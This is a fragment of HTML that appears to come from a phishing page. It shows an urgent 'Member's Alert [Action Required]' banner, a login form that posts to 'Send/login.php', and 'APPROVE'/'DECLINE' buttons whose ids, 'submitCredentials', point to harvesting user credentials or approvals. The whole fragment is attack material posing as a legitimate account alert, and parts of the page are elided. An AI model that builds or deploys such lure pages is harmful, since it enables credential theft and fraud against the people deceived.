...
<form action="Send/login.php" autocomplete="off" method="post" novalidate="novalidate">
...
<div data-v-6745c8f2="" data-v-02a6d155="" class="q-pa-md text-body2 text-red container__note" style="background-color: white; border-left: 5px solid rgb(127, 127, 127);">
<div data-v-6745c8f2="" class="container__content">
<p data-v-02a6d155="" data-v-6745c8f2="" class="q-ma-none text-body1">Member's Alert !!![Action Required]
</p>
</div>
</div>
</div>
...
<input id="submitCredentials" class="q-btn q-btn-item non-selectable no-outline q-mt-lg full-width q-btn--standard q-btn--rectangle  q-btn--wrap" label="SIGN IN"   style="color: white; background-color: #008cff; border-radius: 0px; height: 40px;" type="submit" value="--DECLINE--" >
<h3>-----------------------------------</h3>
<input id="submitCredentials" class="q-btn q-btn-item non-selectable no-outline q-mt-lg full-width q-btn--standard q-btn--rectangle  q-btn--wrap" label="SIGN IN"   style="color: white; background-color: #008cff; border-radius: 0px; height: 40px;" type="submit" value="--APPROVE--" >
</div>
